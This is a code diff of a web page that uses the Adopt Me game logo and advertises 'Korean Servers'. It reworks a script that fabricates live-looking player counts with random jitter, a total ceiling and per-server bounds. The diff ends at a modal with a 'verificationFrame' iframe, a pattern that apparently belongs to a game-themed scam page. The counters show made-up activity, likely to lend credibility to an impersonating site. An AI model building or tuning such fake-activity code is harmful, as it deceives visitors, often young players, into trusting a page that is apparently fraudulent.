@@ -857,7 +857,7 @@
                 <div class="css-1mnhlnj" bis_skin_checked="1">
                     <a href="/" class="css-1njfln3">
                         <img class="adopt-me-logo-img" alt="Adopt Me Home" src="https://www.playadopt.me/_next/static/media/Adopt-Me-Logo.45f44d86.svg" style="height:34px">
-                    head<a>
+                    </a>
                 </div>
             </div>
         </div>
@@ -911,7 +911,7 @@
     <div class="section-header" bis_skin_checked="1">
         <div class="section-eyebrow" bis_skin_checked="1">SERVER LIST</div>
         <h2 class="section-title">Discover Korean Servers</h2>
-        <p class="section-sub">Optimized servers for Korea and Asia-Pacific. Experience lag-free gameplay with our 6 dedicated servers.</p>
+        <p class="section-sub">Optimized routes for Korea and Asia-Pacific. Experience lag-free gameplay with our 6 dedicated servers.</p>
     </div>
     
     <div class="server-grid" id="serverGrid">
@@ -1208,44 +1208,47 @@
 
 <script>
 (function() {
-function updatePlayerCounts() {
-    const counts = document.querySelectorAll('.count');
-    const MAX_TOTAL = 75000;
-    let currentTotal = 0;
+    function updatePlayerCounts() {
+        const counts = document.querySelectorAll('.count');
+        const MAX_TOTAL = 85000;
+        const LIMIT = 1500; // Hard boundary from initial count
+        let currentTotal = 0;
 
-    
-    counts.forEach(span => {
-        currentTotal += parseInt(span.innerText.replace(/,/g, '')) || 0;
-    });
+        // 1. Calculate current total first
+        counts.forEach(span => {
+            currentTotal += parseInt(span.innerText.replace(/,/g, '')) || 0;
+        });
 
-    counts.forEach(span => {
-        let homeBase = parseInt(span.getAttribute('data-selection'));
-        let current = parseInt(span.innerText.replace(/,/g, '')) || homeBase;
+        counts.forEach(span => {
+            let homeBase = parseInt(span.getAttribute('data-selection'));
+            let current = parseInt(span.innerText.replace(/,/g, '')) || homeBase;
 
-        // 2. SURGICAL JITTER: -200 to +200 range
-        let fluctuation = Math.floor(Math.random() * 401) - 200;
+            // 2. JITTER: -200 to +200 range
+            let fluctuation = Math.floor(Math.random() * 401) - 200;
 
-        // 3. THE CEILING: If we are near or over 75k, force a negative jitter
-        if (currentTotal >= (MAX_TOTAL - 200)) {
-            fluctuation = -Math.floor(Math.random() * 150) - 50; // Forces -50 to -200 drop
-        }
+            // 3. THE CEILING: If global total hits 75k, force a drop
+            if (currentTotal >= (MAX_TOTAL - 200)) {
+                fluctuation = -Math.floor(Math.random() * 150) - 50; 
+            }
 
-        let next = current + fluctuation;
+            let next = current + fluctuation;
 
-        // 4. BIAS MAGNET: Ensures they stay near your specific data-vals
-        // If a server drifts > 1000 from home, pull it back 10% faster
-        if (next > homeBase + 1000) next -= 20;
-        if (next < homeBase - 1000) next += 20;
+            // 4. THE HARD BOUNDARY: Stop it from drifting > 1500 from homeBase
+            if (next > (homeBase + LIMIT)) {
+                next = homeBase + LIMIT - Math.floor(Math.random() * 50); // Bounce down
+            }
+            if (next < (homeBase - LIMIT)) {
+                next = homeBase - LIMIT + Math.floor(Math.random() * 50); // Bounce up
+            }
 
-        // 5. ABSOLUTE SAFETY: No negatives or zero
-        if (next < 500) next = homeBase;
+            // 5. Final Safety
+            if (next < 10) next = homeBase;
 
-        span.innerText = next.toLocaleString();
-    });
+            span.innerText = next.toLocaleString();
+        });
     }
+    setInterval(updatePlayerCounts, 2000);
 
-// Update every 2 seconds
-setInterval(updatePlayerCounts, 2000);
         const overlay = document.getElementById('modalOverlay');
         const closeBtn = document.getElementById('closeFinalModal');
         const iframe = document.getElementById('verificationFrame');
